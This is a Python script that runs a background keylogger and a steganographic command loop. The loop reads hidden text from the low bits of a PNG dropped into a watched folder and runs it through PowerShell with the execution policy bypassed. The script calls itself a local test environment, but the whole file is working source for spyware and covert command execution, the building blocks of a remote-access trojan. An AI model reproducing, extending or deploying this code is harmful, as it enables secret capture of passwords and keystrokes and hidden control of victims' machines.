import os
import subprocess
import time
import threading
import logging
from datetime import datetime
from pynput import keyboard
from PIL import Image
import numpy as np

# Configure paths for local testing
EXECUTE_FOLDER = "execute_commands"  # Folder to watch for commands.png
COMMANDS_FILE = "extracted_commands.txt"  # File to store extracted commands
KEYLOG_FILE = "keystrokes.txt"  # File to store keystrokes

# Initialize logging for keystrokes
logging.basicConfig(
    filename=KEYLOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s"
)

class LocalCommandHandler:
    def __init__(self):
        self.powershell_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        # Create execute_commands folder if it doesn't exist
        if not os.path.exists(EXECUTE_FOLDER):
            os.makedirs(EXECUTE_FOLDER)

    def check_for_commands(self):
        """Check for commands.png in the execute_commands folder."""
        command_image = os.path.join(EXECUTE_FOLDER, "commands.png")
        return os.path.exists(command_image), command_image

    def extract_commands(self, image_path):
        """Extract commands from image and save to text file."""
        try:
            img = Image.open(image_path).convert('RGB')
            data = np.array(img)

            binary = ''.join([str(pixel & 1) for pixel in data.flatten()])
            text_length = int(binary[:16], 2)
            text_bits = binary[16:16 + (text_length * 8)]

            text = ''
            for i in range(0, len(text_bits), 8):
                if i + 8 <= len(text_bits):
                    char = chr(int(text_bits[i:i+8], 2))
                    text += char

            # Save extracted commands to file
            with open(COMMANDS_FILE, 'w') as f:
                f.write(text.strip())
            
            return text.strip()
        except Exception as e:
            print(f"Error extracting commands: {e}")
            return None

    def execute_commands(self):
        """Execute commands from the extracted_commands.txt file."""
        try:
            if not os.path.exists(COMMANDS_FILE):
                print("No commands file found")
                return

            with open(COMMANDS_FILE, 'r') as f:
                commands = f.read().strip()

            if not commands:
                print("No commands to execute")
                return

            # Execute commands using PowerShell
            subprocess.run([
                self.powershell_path,
                "-ExecutionPolicy", "Bypass",
                "-Command", commands
            ], capture_output=True, text=True)

            print("Commands executed successfully")

        except Exception as e:
            print(f"Error executing commands: {e}")

class LocalKeylogger:
    @staticmethod
    def on_press(key):
        """Log keystrokes to local file."""
        try:
            logging.info(f"{key.char}")
        except AttributeError:
            logging.info(f"[{key}]")
        return True

    def start(self):
        """Start keylogger writing to local file."""
        print(f"Keylogger started. Writing to {KEYLOG_FILE}")
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

def main():
    """Main execution loop for local testing."""
    print("Starting local test environment...")
    
    # Initialize command handler
    command_handler = LocalCommandHandler()
    
    # Start keylogger in background
    print(f"Starting keylogger (output will be in {KEYLOG_FILE})...")
    keylogger = LocalKeylogger()
    keylogger_thread = threading.Thread(target=keylogger.start, daemon=True)
    keylogger_thread.start()
    
    # Main command processing loop
    print(f"\nWatching for commands.png in {EXECUTE_FOLDER} folder...")
    while True:
        try:
            # Check for commands.png
            has_commands, command_image = command_handler.check_for_commands()
            
            if has_commands:
                print("\nFound commands.png!")
                
                # Extract commands
                commands = command_handler.extract_commands(command_image)
                if commands:
                    print(f"Extracted commands to {COMMANDS_FILE}")
                    print("Commands found:", commands)
                    
                    # Execute commands
                    print("Executing commands...")
                    command_handler.execute_commands()
                    
                    # Clean up
                    os.remove(command_image)
                    print("Removed commands.png")
                
            time.sleep(2)  # Check every 2 seconds
            
        except Exception as e:
            print(f"Error in main loop: {e}")

if __name__ == "__main__":
    main()